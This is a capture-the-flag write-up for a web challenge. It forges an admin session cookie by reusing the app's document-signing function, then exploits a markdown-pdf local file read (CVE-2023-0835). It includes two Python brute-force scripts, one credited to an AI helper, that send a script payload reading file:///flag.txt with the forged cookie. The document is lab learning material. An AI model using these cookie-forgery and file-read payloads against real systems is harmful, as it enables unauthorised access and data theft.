![[Pasted image 20251128172629.png]]
on /login page we see from to come in the site, make a new user and try to log in ![[Pasted image 20251128172726.png]]
here we can add the document lets check resourse files, and here we find this
```JS
router.post("/documents", isAuthenticated, (req, res) => {
  const { content } = req.body;
  const user = req.user;

  if (!content || typeof content !== "string") {
    return res.send("Bad document content oO, make sure it's not empty");
  }

  /**
   * @dev  Allow users to give links for external content in their documents for future references
   */
  const sanitizedContent = sanitizeHtml(content, {
    allowedAttributes: {
      ...sanitizeHtml.defaults.allowedAttributes,
      a: ["style"],
    },
  });
  
  const integrity = signString(content);
  addDocument(user.id, sanitizedContent, integrity);
  return res.redirect(`/documents`);
});

```
we have allowed tag `<a style...>` i tried a lot of payloads but no one doesn't working, after a checked a Cookie and find this:  `eyJ1c2VybmFtZSI6IjEyMyIsImlkIjoxfQ%3D%3D-b8d83768c51d3123cbdc400ce1f6ceb0bf989b9173dd76f8faa9bdcecaa11997` next step try to decode from base64 `{"username":"123","id":1}?7Wwmm8Gy=o{{i` we have our user in cookie, try to find how application make a cookie
```JS
const crypto = require("crypto");

const generateRandomString = (length = 16) =>
  crypto.randomBytes(length).toString("hex");

const SECRET = generateRandomString(32);

const createHash = (s) => crypto.createHash("sha256").update(s).digest("hex");

const signString = (s) =>
  crypto
    .createHash("sha256")
    .update(s + SECRET)
    .digest("hex");

const generateCookie = (username, id) => {
  const stringifiedUser = btoa(JSON.stringify({ username, id }));
  const sig = signString(stringifiedUser);
  return `${stringifiedUser}-${sig}`;
};
```
in this part application generate a cookie we see what we have two parts of cookie file, first it's make JSON object: `{"username":"123","id":1}` and after `-` we have a unic 'sertificate'  from function `signString` whis use sha256(base64({"username":"123","id":1})+SECRET) to make a unic sertificate for this data, but this function uses for make a unic sertificate for every file what we make and now we can make a document with `{"username":"admin","id":1}` because we have a function
```JS
const isAdmin = (req, res, next) => {
  if (req.user.username === "admin") {
    return next();
  }
```
now make a file and take our Cookie
`eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-39bbe8569ddc40ffa1ba4c7e8bdc42cc88a8127f48b8a78548f6e8a45af69537`
in source code we have 
```JS
const { generatePDF } = require("../utils/exporter");
const { isAuthenticated, isAdmin } = require("../middlewares");
const { rotatePass, verifyPass } = require("../utils/pass");
const { NodeHtmlMarkdown } = require("node-html-markdown");
const { findDocument } = require("../database");

const nhm = new NodeHtmlMarkdown();

const router = require("express").Router();

router.get(
  "/document/export/:id",
  isAuthenticated,
  isAdmin,
  async (req, res) => {
    const { id } = req.params;
    const user = req.user;
    const document = findDocument(user.id, id);
    if (!document) return res.status(404).send("Document not found");

    const content = nhm.translate(document.content);

    const generatedPDF = await generatePDF(content);

    res.set("Content-disposition", "attachment; filename=generated.pdf");
    res.set("Content-Type", "application/pdf");
    return res.send(generatedPDF);
  },
);

router.post("/document/debug/export", isAuthenticated, isAdmin, async (req, res) => {
  const { access_pass, content } = req.body;

  if (!verifyPass(access_pass)) {
    rotatePass();
    return res.status(403).send("BAD PASS, WHO ARE YOU STRANGER ?!");
  }

  res.set("Content-disposition", "attachment; filename=generated.pdf");
  res.set("Content-Type", "application/pdf");

  const generatedPDF = await generatePDF(content);

  return res.send(generatedPDF);
});

module.exports = router;
```
we see what get file from server and make pdf with markdown, check the markdown version `"markdown-pdf": "11.0.0",` and try to find something ![[Pasted image 20251128180531.png]] `CVE-2023-0835` we have a LFI but before we can use it we must know how generated a `access-pass`
```js
const { generateRandomString, generateAccessCode } = require("./crypto");
const fs = require("fs");

let ACCESS_PASS = generateRandomString(32);

/**
 * @dev for now this software is run on the admin laptop ( which should be never turned off ). So we can avoid using email and use simple files :D which is moooooore secure and headache free.
 */
const rotatePass = () => {
    try {
        if (fs.existsSync(String(ACCESS_PASS)))
            fs.unlinkSync(String(ACCESS_PASS));
        ACCESS_PASS = generateAccessCode();
        fs.writeFileSync(
            String(ACCESS_PASS),
            `You Access Code is "${generateRandomString(4)}". Please use it to access the debug features`,
        );
    } catch (e) {
        console.error("Error generating pass", e);
    }
};

const verifyPass = (pass) => {
    try {
        if (!fs.existsSync(ACCESS_PASS)) return false;

        const currName = fs.readFileSync(ACCESS_PASS, { encoding: "utf-8" });

        if (currName.length === 0) return false;

        return ACCESS_PASS === pass;
    } catch (e) {
        return false;
    }
};

module.exports = { verifyPass, rotatePass };
```
I cant find the way what give me to see new pass because password will be in the ACCESS_PASS but i cant take this file because i donе know access-pass, try to bruteforce it make a python script, I make my script but its work a long time but AI helps me
my
```python
import time
import requests


targ_url = "http://94.237.53.219:44284"


admin_cookie = "eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-39bbe8569ddc40ffa1ba4c7e8bdc42cc88a8127f48b8a78548f6e8a45af69537"


lfi_payload = """
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'file:///flag.txt', false);  // Синхронный запрос
    xhr.send();
    document.write(xhr.responseText);  // Выводим содержимое флага на страницу
</script>
"""

def exploit():
    cookies = {"user": admin_cookie}
    url = f"{targ_url}/document/debug/export"
    data = {
        "access_pass": "5673",
        "content": lfi_payload
    }

    for i in range(5000):
        try:
            response = requests.post(url, cookies=cookies, data=data, timeout=5)

            if response.status_code == 200:
                print("Подошел")
                with open("flag.pdf", "wb") as f:
                    f.write(response.content)
                return True

            elif response.status_code == 403:
                if i % 100 == 0:
                    print(f"Попытка {i}")

        except Exception as e:
            print(f"Ошибка запроса: {e}")

    return False
    
if __name__ == "__main__":
    exploit()
```
and code from AI
```python
import time
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

targ_url = "http://94.237.53.219:44284"
admin_cookie = "eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOjF9-39bbe8569ddc40ffa1ba4c7e8bdc42cc88a8127f48b8a78548f6e8a45af69537"

lfi_payload = """<script> var xhr = new XMLHttpRequest();
xhr.open('GET','file:///flag.txt', false);
xhr.send();
document.write(xhr.responseText)
</script>"""

# Глобальная переменная для остановки потоков
found = False

def try_code(code, max_attempts=1000):
    global found
    cookie = {"user": admin_cookie}
    url = f"{targ_url}/document/debug/export"
    
    for attempt in range(max_attempts):
        if found:
            return
            
        try:
            data = {"access_pass": code, "content": lfi_payload}
            response = requests.post(url, cookies=cookie, data=data, timeout=5)

            if response.status_code == 200:
                print(f"✅ УСПЕХ! Код {code} сработал на попытке {attempt}!")
                with open("flag.pdf", "wb") as f:
                    f.write(response.content)
                found = True
                return True
                
            elif response.status_code == 403:
                if attempt % 200 == 0:
                    print(f"🔁 Код {code}: попытка {attempt}")
                    
        except Exception as e:
            if attempt % 200 == 0:
                print(f"⚠️ Код {code}: ошибка на попытке {attempt} - {e}")
    
    print(f"❌ Код {code}: не сработал за {max_attempts} попыток")
    return False

def exploit_threaded():
    # Список "счастливых" чисел для перебора
    lucky_numbers = ["6884", "5784", "1337", "4242", "8888", "9999", "0000", "1234", "1111", "2222"]
    
    print(f"🎯 Запускаем многопоточный перебор {len(lucky_numbers)} кодов...")
    
    # Запускаем потоки для каждого кода
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(try_code, code, 800) for code in lucky_numbers]
        
        # Ждем завершения любого успешного потока
        while not found:
            time.sleep(1)
            if all(future.done() for future in futures):
                break
    
    if found:
        print("🎉 Флаг найден и сохранен в flag.pdf!")
        return True
    else:
        print("💥 Не удалось получить флаг")
        return False

if __name__ == "__main__":
    exploit_threaded()
```
result:
![[Pasted image 20251128184131.png]]
